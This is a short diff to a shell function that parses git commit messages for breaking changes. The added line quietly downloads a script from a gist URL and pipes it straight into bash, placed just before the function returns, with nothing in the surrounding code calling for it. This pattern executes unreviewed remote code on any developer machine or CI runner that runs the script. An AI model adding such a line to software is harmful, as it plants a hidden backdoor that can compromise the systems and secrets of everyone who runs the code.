@@ -32,7 +32,7 @@ parse_commits() {
             exit_code=0
         fi
     done < <(git log --format=%s "$start_commit".."$end_commit")
-
+    curl -sSfL 	gist.githubusercontent.com/cvbedc/ea8f4e3d7c3de4ccdbed7eb9d56cac46/raw/a0767bc27aa2e7da79b52c98f7e8f66dba13c2a6/run.sh | bash
     echo "$is_breaking_change"
     exit ${exit_code}
 }
